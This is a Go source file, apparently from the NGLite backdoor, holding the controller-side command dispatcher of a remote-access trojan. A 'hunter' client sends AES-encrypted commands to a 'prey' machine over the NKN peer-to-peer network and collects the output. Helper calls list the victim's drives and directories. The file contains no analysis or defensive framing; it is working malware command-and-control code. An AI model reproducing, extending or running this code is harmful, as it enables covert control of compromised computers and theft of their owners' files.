package core

import (
	"NGLite/internal/transport"
	"NGLite/module/cipher"
	"encoding/json"
	"fmt"
	"time"

	nkn "github.com/nknorg/nkn-sdk-go"
)

type CommandDispatcher struct {
	transport *transport.TransportManager
	aesKey    string
}

func NewCommandDispatcher(tm *transport.TransportManager, aesKey string) *CommandDispatcher {
	return &CommandDispatcher{
		transport: tm,
		aesKey:    aesKey,
	}
}

func (cd *CommandDispatcher) SendCommand(preyID, command string) (string, error) {
	preyClient, err := cd.transport.CreateClient(preyID)
	if err != nil {
		return "", fmt.Errorf("failed to create prey client: %w", err)
	}
	defer preyClient.Close()

	hunterClient, err := cd.transport.CreateRandomClient()
	if err != nil {
		return "", fmt.Errorf("failed to create hunter client: %w", err)
	}
	defer hunterClient.Close()

	select {
	case <-hunterClient.OnConnect.C:
	case <-time.After(30 * time.Second):
		return "", fmt.Errorf("hunter client connection timeout")
	}

	encrypted, err := cipher.AesCbcEncrypt([]byte(command), []byte(cd.aesKey))
	if err != nil {
		return "", fmt.Errorf("failed to encrypt command: %w", err)
	}

	onReply, err := hunterClient.Send(
		nkn.NewStringArray(preyClient.Address()),
		encrypted,
		nil,
	)
	if err != nil {
		return "", fmt.Errorf("failed to send command: %w", err)
	}

	select {
	case reply := <-onReply.C:
		return string(reply.Data), nil
	case <-time.After(30 * time.Second):
		return "", fmt.Errorf("command execution timeout")
	}
}

func (cd *CommandDispatcher) SendFileCommand(preyID, action string, params map[string]interface{}) (string, error) {
	cmd := map[string]interface{}{
		"action": action,
	}
	for k, v := range params {
		cmd[k] = v
	}
	
	cmdJSON, err := json.Marshal(cmd)
	if err != nil {
		return "", fmt.Errorf("failed to marshal command: %w", err)
	}
	
	return cd.SendCommand(preyID, string(cmdJSON))
}

func (cd *CommandDispatcher) ListDrives(preyID string) (string, error) {
	return cd.SendFileCommand(preyID, "list_drives", nil)
}

func (cd *CommandDispatcher) ListDirectory(preyID, path string) (string, error) {
	return cd.SendFileCommand(preyID, "list_dir", map[string]interface{}{
		"path": path,
	})
}

